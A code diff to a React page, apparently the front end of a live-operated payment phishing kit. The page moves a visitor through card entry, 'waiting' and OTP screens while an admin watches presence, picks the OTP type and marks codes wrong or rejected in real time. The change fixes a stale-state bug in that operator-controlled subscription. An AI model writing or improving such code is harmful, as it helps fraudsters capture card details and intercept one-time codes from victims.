@@ -10,6 +10,8 @@ import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
   const [step, setStep] = useState<"form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
+  const stepRef = useRef(step);
+  stepRef.current = step;
   const visitorId = useRef(crypto.randomUUID());
 
   // Join presence channel so admin knows someone is on the page
@@ -64,7 +66,7 @@ const Index = () => {
   }, []);
 
   useEffect(() => {
-    if (!sessionId || (step !== "processing_card" && step !== "waiting" && step !== "processing" && step !== "otp")) return;
+    if (!sessionId) return;
 
     const channel = supabase
       .channel(`session-${sessionId}`)
@@ -78,7 +80,9 @@ const Index = () => {
         },
         (payload) => {
           const newStatus = (payload.new as any).status;
-          if (step === "processing_card" || step === "waiting") {
+          const currentStep = stepRef.current;
+          
+          if (currentStep === "processing_card" || currentStep === "waiting") {
             if (newStatus === "otp") {
               setOtpError(null);
               const formData = (payload.new as any).form_data || {};
@@ -92,8 +96,7 @@ const Index = () => {
               setSessionId(null);
             }
           }
-          if (step === "otp") {
-            // Allow admin to change OTP type while user is already on OTP screen
+          if (currentStep === "otp") {
             if (newStatus === "otp") {
               const formData = (payload.new as any).form_data || {};
               setOtpType((formData.otp_type as OtpType) || "6digit");
@@ -111,7 +114,7 @@ const Index = () => {
               setSessionId(null);
             }
           }
-          if (step === "processing") {
+          if (currentStep === "processing") {
             if (newStatus === "success") setStep("success");
             if (newStatus === "rejected") setStep("rejected");
             if (newStatus === "otp_wrong") {
@@ -135,7 +138,7 @@ const Index = () => {
     return () => {
       supabase.removeChannel(channel);
     };
-  }, [sessionId, step]);
+  }, [sessionId]);
 
   const handleOtpSubmit = async (otp: string) => {
     setOtpError(null);
